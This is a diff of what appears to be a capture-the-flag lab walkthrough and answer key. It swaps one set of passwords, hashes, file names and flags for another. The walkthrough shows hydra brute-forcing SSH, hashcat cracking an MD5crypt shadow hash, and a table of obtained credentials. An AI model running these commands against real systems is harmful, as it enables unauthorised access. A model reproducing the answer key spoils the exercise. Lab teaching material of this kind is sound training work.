@@ -43,10 +43,10 @@ hydra -l ryland -P /usr/share/wordlists/rockyou.txt ssh://10.7.N.1
 
 **Expected output:**
 ```
-[22][ssh] host: 10.7.N.1   login: ryland   password: astrophage
+[22][ssh] host: 10.7.N.1   login: ryland   password: hellokitty
 ```
 
-**Credentials found:** `ryland:astrophage`
+**Credentials found:** `ryland:hellokitty`
 
 > **Note:** This will take several minutes. The password appears around line 169,000 of rockyou.txt.
 
@@ -68,8 +68,8 @@ cat /var/mail/ryland
 
 **Expected output:**
 ```
-From: ryland.grace@astrophage-project.net
-To: stratt@astrophage-project.net
+From: ryland.grace@hellokitty-project.net
+To: stratt@hellokitty-project.net
 Date: Mon, 14 Nov 2022 09:12:44 +0000
 Subject: FTP access to tau-ceti relay
 
@@ -134,7 +134,7 @@ cat shadow
 
 **Expected output:**
 ```
-rocky:$1$hailmary$3Q.jtfyjzx8FjZ5UGLFY3/:19000:0:99999:7:::
+rocky:$1$hailmary$ahx9IaEq7304SRR3akXGK.:19000:0:99999:7:::
 ```
 
 This is an MD5crypt hash (`$1$`) for user `rocky`. You need to crack it.
@@ -151,10 +151,10 @@ hashcat -m 500 shadow /usr/share/wordlists/rockyou.txt
 
 **Expected output:**
 ```
-$1$hailmary$3Q.jtfyjzx8FjZ5UGLFY3/:adrian
+$1$hailmary$ahx9IaEq7304SRR3akXGK.:bluemoon
 ```
 
-**Password cracked:** `rocky:adrian`
+**Password cracked:** `rocky:bluemoon`
 
 > **Note:** If hashcat has already cracked this hash, use `--show` to display the result:
 > ```bash
@@ -183,13 +183,13 @@ ls
 
 **Expected output:**
 ```
-astrophage_data.txt
+hellokitty_data.txt
 ```
 
 Read it:
 
 ```bash
-cat astrophage_data.txt
+cat hellokitty_data.txt
 ```
 
 **Expected output:**
@@ -205,13 +205,13 @@ ls -a
 
 **Expected output:**
 ```
-.  ..  .astrophage_data.txt  .bash_logout  .bashrc  .profile  astrophage_data.txt
+.  ..  .hellokitty_data.txt  .bash_logout  .bashrc  .profile  hellokitty_data.txt
 ```
 
-There it is — `.astrophage_data.txt`. Read it:
+There it is — `.hellokitty_data.txt`. Read it:
 
 ```bash
-cat .astrophage_data.txt
+cat .hellokitty_data.txt
 ```
 
 **Expected output:**
@@ -225,7 +225,7 @@ signature at 25.984 THz. Bloom density estimated 2.4x Tau Ceti reference levels.
 
 This system is further along than we thought. Rocky's numbers don't lie.
 
->> FLAG{astrophage_confirmed_tau_ceti_e_tNN} <<
+>> FLAG{hellokitty_confirmed_tau_ceti_e_tNN} <<
 ```
 
 Where `NN` is your assigned team number (e.g. `t01`, `t02`).
@@ -235,7 +235,7 @@ Where `NN` is your assigned team number (e.g. `t01`, `t02`).
 ## Flag
 
 ```
-FLAG{astrophage_confirmed_tau_ceti_e_tNN}
+FLAG{hellokitty_confirmed_tau_ceti_e_tNN}
 ```
 
 Replace `NN` with your team number.
@@ -266,11 +266,11 @@ cat shadow
 hashcat -m 500 shadow /usr/share/wordlists/rockyou.txt
 
 # 6. SSH eridani
-ssh rocky@10.7.N.3    # password: adrian
+ssh rocky@10.7.N.3    # password: bluemoon
 
 # 7. Find flag
 ls -a
-cat .astrophage_data.txt
+cat .hellokitty_data.txt
 ```
 
 ---
@@ -279,6 +279,6 @@ cat .astrophage_data.txt
 
 | Host       | IP          | Service | Username  | Password       | How Obtained          |
 |------------|-------------|---------|-----------|----------------|----------------------|
-| `sol`      | 10.7.N.1    | SSH     | `ryland`  | `astrophage`   | hydra + rockyou.txt  |
+| `sol`      | 10.7.N.1    | SSH     | `ryland`  | `hellokitty`   | hydra + rockyou.txt  |
 | `tau-ceti` | 10.7.N.2    | FTP     | `stratt`  | `petrova`      | email on sol         |
-| `eridani`  | 10.7.N.3    | SSH     | `rocky`   | `adrian`       | hashcat on shadow    |
+| `eridani`  | 10.7.N.3    | SSH     | `rocky`   | `bluemoon`       | hashcat on shadow    |
